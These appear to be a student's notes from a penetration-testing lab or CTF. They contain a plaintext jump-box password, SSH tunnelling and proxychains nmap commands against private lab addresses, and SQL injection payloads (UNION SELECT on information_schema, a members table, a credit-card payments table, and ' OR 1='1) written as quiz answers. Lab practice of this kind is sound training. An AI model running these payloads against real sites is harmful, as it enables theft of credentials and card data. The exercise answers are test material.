# JB Password:
```
v0cEcUbwIzY878p
```
# MS setup: 
```
ssh -MS /tmp/jump student@10.50.37.98	     

ssh -S /tmp/jump jump -O forward -D 9050

ssh -MS /tmp/web student@10.50.37.98

ssh -S /tmp/web web -O forward -L 2224:10.100.28.40:4444

ssh -S /tmp/jump jump -O cancel -D9050

ssh -S /tmp/web web -O forward -D9050

proxychains nmap -Pn -n -T5 10.100.28.55

proxychains nmap --script http-enum 10.100.28.55
```

-----------------------------------------------------------------------

    Golden Rule:
    ```
    127.0.0.1:1111/cases/productsCategory.php?category=13 UNION SELECT table_schema,table_name,column_name from information_schema.columns
    ```
    ### step 4:  Craft more tailored queries
    q3 * Provide the password for users with administrator access to the DNLA database. To answer input the flag.
    ```
    127.0.0.1:1111/cases/productsCategory.php?category=13 UNION SELECT username,password,permission from sqlinjection.members
    ```
    q4 * Utilizing the Search page on DNLA, identify the vulnerability to find the flag. To answer input only the characters inside the flag.
    ```
    ' OR 1='1
    ```
    q5 * Identify the version of the database that DNLA is utilizing.To answer input the full version.
    ```
    http://127.0.0.1:1111/cases/productsCategory.php?category=1 UNION SELECT table_schema,@@version,column_name from information_schema.columns
    ```


## q6 * Utilizing the input field on DNLA budget page, find the flag associated with credit cards. To answer the question enter only the characters inside the flag.
```

127.0.0.1:1111/cases/productsCategory.php?category=13 UNION SELECT username,password,permission from sqlinjection.members

'UNION SELECT id,creditcard_number,order from sqlinjection.payments' query

```


## q7 * Find the flag associated with id 1337.
```

```
## q8 * Using the /cases/register.php page on DNLA create a user with admin permissions, ensuring the firstname is set to Hacker. Once created log in to get the flag.
(meh !! I ain't pressed)
